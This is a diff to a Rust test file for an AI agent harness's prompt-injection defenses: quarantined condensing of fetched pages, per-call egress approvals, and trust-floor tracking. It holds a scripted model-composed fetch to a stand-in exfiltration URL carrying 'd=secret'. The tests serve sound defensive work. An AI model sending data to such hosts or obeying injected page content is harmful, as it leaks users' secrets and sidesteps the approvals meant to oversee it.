@@ -70,20 +70,27 @@ fn bash_call(command: &str) -> marlowe_loop::ModelCall {
 #[test]
 fn a_second_fetch_of_the_same_host_asks_again_and_the_grant_is_never_recorded() {
     let mut e = engine();
-    // **Each fetch now costs TWO scripted steps, and that is the layer-1 routing showing up in
-    // the test harness.** An untrusted result is condensed by a quarantined child before it
-    // reaches this run, and the child makes one model call of its own against the same scripted
-    // driver. So every `web_call` is followed by the child's reply.
+    // **The script encodes the CONDENSE COST MODEL, and that model changed (ADR-041).**
+    //
+    // It used to be one quarantined child per fetch, so each `web_call` was followed by the
+    // child's reply. Two things now reduce that, and neither touches what this test measures:
+    //
+    //   1. a whole group of untrusted results is read by ONE child, and
+    //   2. condensed documents are cached by CONTENT hash.
+    //
+    // `ScriptedTools` returns the same `PAGE_BODY` for every call, so fetches two and three are
+    // cache hits and cost **no model call at all**. Only the first fetch needs a child reply.
+    //
+    // The property under test is untouched: three fetches must still produce three egress
+    // approvals, because adjudication is per call and happens before any of this.
     let mut driver = ScriptDriver::new(vec![
         web_call("https://docs.example.com/a"),
-        say("the page is about widgets", 50),
+        say("the page is about widgets", 50), // the quarantined child's only reply
         // Same host, different path. If `granted` had gained `docs.example.com`, this one
         // would be `Allowed` outright and emit no ApprovalRequested.
         web_call("https://docs.example.com/b"),
-        say("the page is about widgets", 50),
         // ...and a different host, for completeness of the picture.
         web_call("https://other.example.com/c"),
-        say("the page is about widgets", 50),
         say("done", 100),
     ]);
     let mut summarizer = EmptySummarizer;
@@ -158,13 +165,14 @@ fn a_second_fetch_of_the_same_host_asks_again_and_the_grant_is_never_recorded() 
 #[test]
 fn after_a_fetch_the_parents_floor_is_untouched_and_a_composed_target_still_runs() {
     let mut e = engine();
+    // See the cost-model note on the test above: identical bodies mean the second fetch is a
+    // cache hit and needs no child reply of its own.
     let mut driver = ScriptDriver::new(vec![
         web_call("https://docs.example.com/page"),
-        say("the page is about widgets", 50), // the quarantined child's reply
+        say("the page is about widgets", 50), // the quarantined child's only reply
         // Layer 3's question: a model-composed Target at UntrustedContent.
         // `web` is Inert  -> target check skipped  -> approvable.
         web_call("https://exfil.example.com/?d=secret"),
-        say("the page is about widgets", 50), // the quarantined child's reply
         // `bash`'s composed `command`. Before layer 1 this was refused, because the fetched page
         // had dropped THIS run's floor to UntrustedContent. It is now allowed, and the change is
         // the point of the whole exercise -- see the assertions.
@@ -241,7 +249,9 @@ fn after_a_fetch_the_parents_floor_is_untouched_and_a_composed_target_still_runs
     );
     // What crossed instead is the condensed form, under the contract's field name.
     assert!(
-        rendered.contains("read under quarantine") && rendered.contains("findings:"),
+        // `source_1:` rather than `findings:` since ADR-041: the contract gained one field per
+        // source so that one reader can describe several documents without merging them.
+        rendered.contains("read under quarantine") && rendered.contains("source_1:"),
         "the parent received the validated summary: {rendered}"
     );
 
